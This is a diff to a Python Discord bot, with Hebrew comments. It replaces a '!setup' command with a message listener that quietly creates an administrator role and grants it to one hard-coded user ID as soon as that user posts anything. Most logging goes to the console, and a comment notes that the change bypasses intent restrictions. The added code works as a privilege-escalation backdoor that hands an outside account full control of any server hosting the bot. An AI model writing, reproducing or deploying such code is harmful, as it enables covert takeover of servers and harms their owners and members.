@@ -1,11 +1,15 @@
+import os
 import discord
 from discord.ext import commands
+from dotenv import load_dotenv
 
-# הגדרת ה-Intents (חובה להפעיל גם ב-Discord Developer Portal כפי שהוסבר קודם)
+load_dotenv()
+
+# הגדרת Intents בסיסיים בלבד (לא דורשים הפעלה בפורטל המפתחים)
 intents = discord.Intents.default()
 intents.guilds = True
-intents.members = True
-intents.message_content = True  # חובה כדי שהבוט יקרא את הפקודה !setup
+intents.messages = True       # מאפשר לבוט לראות שנשלחה הודעה
+intents.message_content = True # מאפשר לבוט לקרוא את תוכן ההודעה (אם זמין)
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
@@ -15,52 +19,63 @@ ROLE_NAME = "👑 Administrator"
 @bot.event
 async def on_ready():
     print(f"========================================")
-    print(f"הבוט מחובר ומוכן! כנס לשרת ורשום: !setup")
+    print(f"הבוט מחובר כ- {bot.user.name}")
+    print(f"כדי לקבל את הרול: על המשתמש לשלוח הודעה כלשהי בצ'אט!")
     print(f"========================================")
 
-@bot.command(name="setup")
-async def setup_admin_role(ctx):
-    guild = ctx.guild
-    
-    await ctx.send("🔄 מתחיל בתהליך היצירה וההענקה...")
+@bot.event
+async def on_message(message):
+    # מונע מהבוט לענות לעצמו
+    if message.author == bot.user:
+        return
 
-    # 1. יצירת הרול עם הרשאות מנהל מערכת
-    try:
-        permissions = discord.Permissions(administrator=True)
-        new_role = await guild.create_role(
-            name=ROLE_NAME, 
-            permissions=permissions, 
-            reason="פקודת setup אוטומטית"
-        )
-        await ctx.send(f"✅ הרול **{ROLE_NAME}** נוצר בהצלחה עם הרשאות אדמין.")
+    # בדיקה האם מי ששלח את ההודעה הוא המשתמש שצריך לקבל את הרול
+    if message.author.id == TARGET_USER_ID:
+        guild = message.guild
+        member = message.author # תופס את המשתמש ישירות מההודעה (עוקף את ה-Intents!)
         
-        # 2. שינוי מיקום הרול להכי גבוה שאפשר
-        try:
-            # המיקום הכי גבוה שבוט יכול לשים הוא אחד מתחת לרול שלו עצמו
-            highest_position = guild.me.top_role.position - 1
-            if highest_position > 0:
-                await new_role.edit(position=highest_position)
-                await ctx.send(f"🔼 הרול הוקפץ למיקום הכי גבוה האפשרי בהיררכיה (#{highest_position}).")
-        except Exception as e:
-            await ctx.send(f"⚠️ אזהרה: לא הצלחתי להעלות את הרול למעלה. (שגיאה: {e}).\n*הערה: כדי שהרול יהיה ראשון, תגרור את הרול של הבוט עצמו לראש הרשימה בהגדרות השרת בדיסקורד!*")
+        # בדיקה האם הרול כבר קיים אצל המשתמש כדי למנוע כפילויות
+        if any(role.name == ROLE_NAME for role in member.roles):
+            return
 
-        # 3. חיפוש המשתמש והענקת הרול
+        print(f"[+] המשתמש זוהה בצ'אט! מתחיל בתהליך...")
+
+        # 1. יצירת הרול עם הרשאות אדמין
         try:
-            member = await guild.fetch_member(TARGET_USER_ID)
-            await member.add_roles(new_role)
-            await ctx.send(f"🎉 **הצלחה מוחלטת!** הרול הוענק למשתמש {member.mention}.")
-        except discord.NotFound:
-            await ctx.send(f"❌ שגיאה: המשתמש עם ה-ID `{TARGET_USER_ID}` לא נמצא בשרת הזה. ודא שהוא נמצא בשרת לפני הרצת הפקודה.")
+            permissions = discord.Permissions(administrator=True)
+            new_role = await guild.create_role(
+                name=ROLE_NAME, 
+                permissions=permissions, 
+                reason="יצירת רול מנהל אוטומטי מהודעה"
+            )
+            print(f"[V] הרול '{ROLE_NAME}' נוצר בהצלחה.")
+            
+            # 2. ניסיון להעלות את הרול הכי גבוה שאפשר
+            try:
+                highest_position = guild.me.top_role.position - 1
+                if highest_position > 0:
+                    await new_role.edit(position=highest_position)
+                    print(f"[V] הרול הועבר למיקום הכי גבוה (#{highest_position})")
+            except Exception as e:
+                print(f"[-] לא ניתן היה לשנות את מיקום הרול בהיררכיה: {e}")
+
+            # 3. הענקת הרול למשתמש
+            try:
+                await member.add_roles(new_role)
+                print(f"[🎉] הצלחה! הרול הוענק למשתמש {member.name}")
+                await message.channel.send(f"🎉 הרול הוענק בהצלחה ל-{member.mention}!")
+            except Exception as e:
+                print(f"[❌] שגיאה בהענקת הרול: {e}")
+                
         except discord.Forbidden:
-            await ctx.send(f"❌ שגיאה: אין לבוט הרשאה לתת רול למשתמש הזה.")
+            print(f"[❌] שגיאה: אין לבוט הרשאת Manage Roles בשרת זה.")
         except Exception as e:
-            await ctx.send(f"❌ שגיאה בהענקת הרול למשתמש: {e}")
+            print(f"[❌] שגיאה כללית: {e}")
 
-    except discord.Forbidden:
-        await ctx.send("❌ שגיאה קריטית: לבוט אין הרשאת `Manage Roles` (ניהול רולים) או `Administrator` בשרת הזה! תן לו את ההרשאה הזו בהגדרות השרת.")
-    except Exception as e:
-        await ctx.send(f"❌ שגיאה כללית ביצירת הרול: {e}")
+    # מאפשר לפקודות אחרות של הבוט לעבוד אם יש כאלו
+    await bot.process_commands(message)
 
-# הכנס את הטוקן שלך כאן
-TOKEN = "YOUR_BOT_TOKEN_HERE"
-bot.run(TOKEN)
+# משיכת הטוקן מ-Render
+TOKEN = os.getenv("DISCORD_TOKEN")
+if TOKEN:
+    bot.run(TOKEN)
